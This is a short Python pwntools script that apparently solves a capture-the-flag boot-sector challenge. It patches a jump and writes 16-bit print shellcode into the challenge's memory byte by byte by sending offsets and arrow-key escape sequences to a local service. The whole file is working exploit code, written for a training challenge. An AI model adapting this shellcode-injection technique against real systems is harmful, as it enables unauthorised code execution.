#!/usr/bin/env python3

import ctypes

from pwn import *

start = 0x7c04
sc_addr = 0x7c09
jmp_addr = 0x7c30

patch_jmp = ctypes.c_uint8(sc_addr - jmp_addr).value

# up arrow (obtained from doing CTRL+v+Up in terminal)
up_arrow = b"\x1b[A"

# down arrow (obtained from doing CTRL+v+Down in terminal)
down_arrow = b"\x1b[B"

"""
mov si, 0x7dc6
mov cl, 0x38
print:
    lodsb
    mov ah, 0xe
    int 0x10
    loop print
"""
sc = b"\xBE\xC6\x7D\xB1\x38\xAC\xB4\x0E\xCD\x10\xE2\xF9\x00"
with open("./babybs.bin", "rb") as f:
    f.read(sc_addr & 0xff)
    ori = f.read(len(sc))
    # print(ori)
final = []
for i in range(len(sc)):
    final.append(ctypes.c_uint8(sc[i] - ori[i]).value)
final = bytes(final)
# print(final)


def write_byte(addr, b: int):
    offset = addr - start + ord("0")
    action = up_arrow
    print(hex(b))
    if b >= 0x80:
        action = down_arrow
        b = 0x100 - b

    for _ in range(b):
        time.sleep(0.1)
        io.send(struct.pack("<B", offset))
        io.send(action)


# def end():
#     end_marker = p32(0x13371337)
#     for i in range(len(end_marker)):
#         write_byte(start + i, end_marker[i])


io = remote('localhost', 10000)
io.recvuntil(b"Disk...")
write_byte(jmp_addr + 1, patch_jmp)
for i in range(len(final)):
    write_byte(sc_addr + i, final[i])
io.send(b"\x1b")
# end()
io.interactive()
